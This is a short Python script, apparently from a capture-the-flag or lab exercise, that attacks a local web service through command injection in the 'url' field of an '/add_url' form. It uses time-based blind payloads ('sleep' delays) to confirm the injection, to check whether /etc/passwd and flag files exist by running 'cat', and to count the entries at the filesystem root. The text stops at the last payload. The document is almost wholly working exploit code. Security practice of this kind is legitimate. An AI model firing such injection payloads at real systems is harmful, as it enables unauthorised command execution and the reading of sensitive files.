import requests
import time

base_url = "http://127.0.0.1:32998"
add_url = f"{base_url}/add_url"

print("="*60)
print("VERIFICATION AND SIMPLER TESTS")
print("="*60)

# First verify command injection still works
print("\n[*] Verifying command injection works...")
payloads = [
    ("sleep 0", "No sleep (baseline)"),
    ("sleep 2", "Sleep 2 seconds"),
    ("sleep 4", "Sleep 4 seconds"),
]

for cmd, desc in payloads:
    start = time.time()
    resp = requests.post(add_url, data={"url": cmd}, timeout=10)
    elapsed = time.time() - start
    print(f"  {desc}: {elapsed:.2f}s")

# Try direct file existence checks with simpler commands
print("\n[*] Direct file checks...")

test_files = [
    "/etc/passwd",
    "/etc/hosts", 
    "/flag.txt",
    "/flag",
]

for filepath in test_files:
    # Different approaches to check file
    
    # Method 1: Direct cat (should error if not exists)
    print(f"\n  Checking {filepath}:")
    
    # Try reading and measure time
    payload = f"cat {filepath} 2>/dev/null && sleep 1"
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=5)
        elapsed = time.time() - start
        if elapsed > 0.8:
            print(f"    [+] File exists (cat succeeded, delay: {elapsed:.2f}s)")
        else:
            print(f"    [-] File not found or empty (delay: {elapsed:.2f}s)")
    except:
        elapsed = time.time() - start
        print(f"    [!] Timeout after {elapsed:.2f}s")

# Try to list ALL files/folders at root
print("\n[*] Attempting to get file listing...")

# Run ls and cause delay based on line count
payload = "file_count=$(ls / 2>/dev/null | wc -l); sleep $file_count"
